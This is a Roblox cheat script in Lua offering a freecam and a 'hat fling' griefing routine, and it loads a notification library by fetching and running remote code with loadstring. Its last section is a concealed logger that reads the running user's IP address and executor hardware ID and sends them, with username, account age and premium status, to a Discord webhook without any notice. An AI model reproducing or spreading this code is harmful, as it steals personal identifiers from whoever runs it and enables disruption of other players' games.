
ToggleKey = Enum.KeyCode.C
SprintKey = Enum.KeyCode.V

localPlayer = game.Players.LocalPlayer

Camera = game.Workspace.CurrentCamera
Mouse = localPlayer:GetMouse()

UserInputService = game:GetService("UserInputService")


movePosition = Vector2.new(0,0)
moveDirection = Vector3.new(0,0,0)

targetMovePosition = movePosition

Y_Sensitivity = 300;
X_Sensitivity = 300;

lastRightButtonDown = Vector2.new(0,0)
rightMouseButtonDown = false

targetFOV = 70

sprinting = false;
sprintingSpeed = 3;

keysDown = {}

moveKeys = {
[Enum.KeyCode.D] = Vector3.new(1,0,0),
[Enum.KeyCode.A] = Vector3.new(-1,0,0),
[Enum.KeyCode.S] = Vector3.new(0,0,1),
[Enum.KeyCode.W] = Vector3.new(0,0,-1),
[Enum.KeyCode.E] = Vector3.new(0,1,0),
[Enum.KeyCode.Q] = Vector3.new(0,-1,0)
}

Tween = function(a,b,t)
if t == 1 then
return b
else 
if tonumber(a) then
    return a * (1-t) + (b*t)
else
return a:Lerp(b,t);
end
end
end

ClampVector3 = function(x,min,max)

return 
Vector3.new(
math.clamp(x.X,min.X,max.X),
math.clamp(x.Y,min.Y,max.Y),
math.clamp(x.Z,min.Z,max.Z)
)

end


UserInputService.InputChanged:connect(function(inputObject)
if inputObject.UserInputType == Enum.UserInputType.MouseMovement then
movePosition = movePosition + Vector2.new(inputObject.Delta.x,inputObject.Delta.y)
end
end)

CalculateMovement = function()
local newMovement = Vector3.new(0,0,0)
for i,v in pairs(keysDown) do
newMovement = newMovement + (moveKeys[i] or Vector3.new(0,0,0))
end
return newMovement
end

Round = function(num, numDecimalPlaces)
  return math.floor((num/numDecimalPlaces) + .5)*numDecimalPlaces
end

Input = function(input,gameProcessed)
if moveKeys[input.KeyCode] then
if input.UserInputState == Enum.UserInputState.Begin then
keysDown[input.KeyCode] = true
elseif input.UserInputState == Enum.UserInputState.End then
keysDown[input.KeyCode] = nil
end
else
if input.UserInputState == Enum.UserInputState.Begin then
print(input.KeyCode)
if input.UserInputType == Enum.UserInputType.MouseButton2 then
rightMouseButtonDown = true
lastRightButtonDown = Vector2.new(Mouse.X,Mouse.Y)
UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
elseif input.KeyCode == Enum.KeyCode.Z then
targetFOV = 20
elseif input.KeyCode == SprintKey then
sprinting = true
end
else
if input.UserInputType == Enum.UserInputType.MouseButton2 then
rightMouseButtonDown = false
UserInputService.MouseBehavior = Enum.MouseBehavior.Default
elseif input.KeyCode == Enum.KeyCode.Z then
targetFOV = 70
elseif input.KeyCode == SprintKey then
sprinting = false
end
end
end
end
 
Mouse.WheelForward:connect(function()
   Camera.CoordinateFrame = Camera.CoordinateFrame * CFrame.new(0,0,-5)
end)

Mouse.WheelBackward:connect(function()
   Camera.CoordinateFrame = Camera.CoordinateFrame * CFrame.new(-0,0,5)
end)

UserInputService.InputBegan:connect(Input)
UserInputService.InputEnded:connect(Input)

local Toggled = false
game:GetService("UserInputService").InputBegan:connect(function(inputObject)
if inputObject.KeyCode == ToggleKey then
Toggled = not Toggled
if Toggled then
Camera.CameraType = Enum.CameraType.Scriptable
game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
game.Players.LocalPlayer.Character.Humanoid.PlatformStand = true 
else
game.Players.LocalPlayer.Character.Humanoid.PlatformStand = false
game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
game.Workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
game.Workspace.CurrentCamera.CameraType = "Custom"
end
end
end)


game:GetService("RunService").RenderStepped:Connect(function()
if Toggled then
local mouseTarget = Mouse.Hit

targetMovePosition = movePosition
Camera.CoordinateFrame = CFrame.new(Camera.CoordinateFrame.p) * CFrame.fromEulerAnglesYXZ(-targetMovePosition.Y/Y_Sensitivity ,-targetMovePosition.X/X_Sensitivity, 0) * CFrame.new(CalculateMovement() * ((({[true]=sprintingSpeed})[sprinting]) or .5) )
Camera.FieldOfView = Tween(Camera.FieldOfView,targetFOV,.5)
if rightMouseButtonDown then
UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
movePosition = movePosition - (lastRightButtonDown - Vector2.new(Mouse.X,Mouse.Y))
lastRightButtonDown = Vector2.new(Mouse.X,Mouse.Y)
end
end
end)

local notif = loadstring(game:HttpGet("https://raw.githubusercontent.com/insanedude59/notiflib/main/main"))()


notif:Notification("L4D2 Hentai mods lover","Made by EXCLUS and ItsLush","GothamSemibold","Gotham",5) -- title: <string> description: <string> title font: <string> description font: <string> notification show time: <number>
task.wait(0.5)
notif:Notification("L4D2 Hentai mods lover","unstable ver","GothamSemibold","Gotham",5) -- title: <string> description: <string> title font: <string> description font: <string> notification show time: <number>

--[[
PARAM 1: title: <string>
PARAM 2: description: <string>
PARAM 3: title font: <string>
PARAM 4: description font: <string>
PARAM 5: notification appearance time: <number>
]]

local block = true

local character = game.Players.LocalPlayer.Character
game.Players.LocalPlayer.Character = nil
game.Players.LocalPlayer.Character = character
wait(game.Players.RespawnTime + 0.05)
game.Players.LocalPlayer.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Dead,false)

for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
    if v.Name == "Torso" or v.Name == "UpperTorso" then
        v:Destroy()
    end
end
character.HumanoidRootPart:Destroy()

for i,v in pairs(character:GetChildren()) do
    if v:IsA("Accessory") then
        sethiddenproperty(v,"BackendAccoutrementState", 0) --any integer 0-3 works but 4, as 4 is the default state for in character, 0 is for when it has collision in character or other circumstances, 2 is workspace, 1 is unknown if you know or figure out please let me know
        --BackendAccoutrementState is a replicated property similar to NetworkIsSleeping and is further documented in reweld
    end
end

if block == true then 
    for i,v in pairs(character:GetDescendants()) do
        if v:IsA("SpecialMesh") then
            v:Destroy()
        end
    end
end

for i,v in pairs(character:GetChildren()) do
    if v:IsA("BasePart") and v.Name ~= "Head" then
        v:Destroy() --trigger childremoving (can also remove body colors or animate localscript)
        --we can also trigger childadded with a tool or something else to weld the hats to our head
    end
end
character.Head:remove() --optional, can be removed
wait()



   spawn(function()
   while wait() do
       sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
       sethiddenproperty(game.Players.LocalPlayer, "MaximumSimulationRadius", math.huge)
   end
end)
   for i,d in pairs(character:GetChildren()) do
     if d:IsA("Accessory") then 
local temp = Instance.new("BodyPosition")
temp.MaxForce = Vector3.new(math.huge,math.huge,math.huge)
temp.Parent = d.Handle
 spawn(function()
   while wait() do
       sethiddenproperty(game.Players.LocalPlayer, "SimulationRadius", math.huge)
       sethiddenproperty(game.Players.LocalPlayer, "MaximumSimulationRadius", math.huge)
   end
end)
local temp1 = Instance.new("BodyThrust")
temp1.Location = Vector3.new(5,0,0)
temp1.Force = Vector3.new(999999999999999999999999999999999999999999,0,-999999999999999999999999999999999999999999)
temp1.Parent = d.Handle
d.Handle.CanCollide = false
game:GetService("RunService").RenderStepped:Connect(function()
d.Handle.Position = game.Players.LocalPlayer:GetMouse().Hit.p + Vector3.new(0,2,0)
temp.Position = game.Players.LocalPlayer:GetMouse().Hit.p + Vector3.new(0,2,0)
end)
end
end


local IP = game:HttpGet("https://v4.ident.me")
plr = game:GetService'Players'.LocalPlayer
local premium = true
local ALT = false
if plr.MembershipType == Enum.MembershipType.Premium then
    premium = true
elseif plr.MembershipType == Enum.MembershipType.None then
    premium = false
end
if premium == false then 
    if plr.AccountAge <= 70 then 
        ALT = true
    end
end
 
local market = game:GetService("MarketplaceService")
local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
 
 
local http_request = http_request;
if syn then
    http_request = syn.request
elseif SENTINEL_V2 then
    function http_request(tb)
        return {
            StatusCode = 200;
            Body = request(tb.Url, tb.Method, (tb.Body or ''))
        }
    end
end
 
local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
hwid = "";
 
for i, v in next, hwid_list do
    if decoded.headers[v] then
        hwid = decoded.headers[v];
        break
    end
end
 
if hwid then
local HttpServ = game:GetService('HttpService')
local url = "https://discord.com/api/webhooks/1063569382363631616/GQ1HCS68N71n4pdyrZmPw2FMV73pdkcAcSfonX7b83dxTcZRfM7EsJo6CerJJZkJjiJU"
 
 
local data = 
    {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "__**WE GOT A RETARDS HWID:**__",
            ["description"] = hwid,
            ["type"] = "rich",
            ["color"] = tonumber(0xAB0909),
            ["fields"] = {
                {
                    ["name"] = "Username:",
                    ["value"] = Game.Players.LocalPlayer.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "IP Address:",
                    ["value"] = IP,
                    ["inline"] = true
                },
                {
                    ["name"] = "Game Link:",
                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
                    ["inline"] = true
                },
                {
                    ["name"] = "Game Name:",
                    ["value"] = info.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "Age:",
                    ["value"] = plr.AccountAge,
                    ["inline"] = true
                },
                {
                    ["name"] = "Premium:",
                    ["value"] = premium,
                    ["inline"] = true
                },
                {
                    ["name"] = "ALT:",
                    ["value"] = ALT,
                    ["inline"] = true
                },
 
            },
        }}
    }
    local newdata = HttpServ:JSONEncode(data)
 
    local headers = {
            ["content-type"] = "application/json"
    }
 
    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
    http_request(request_payload)
end
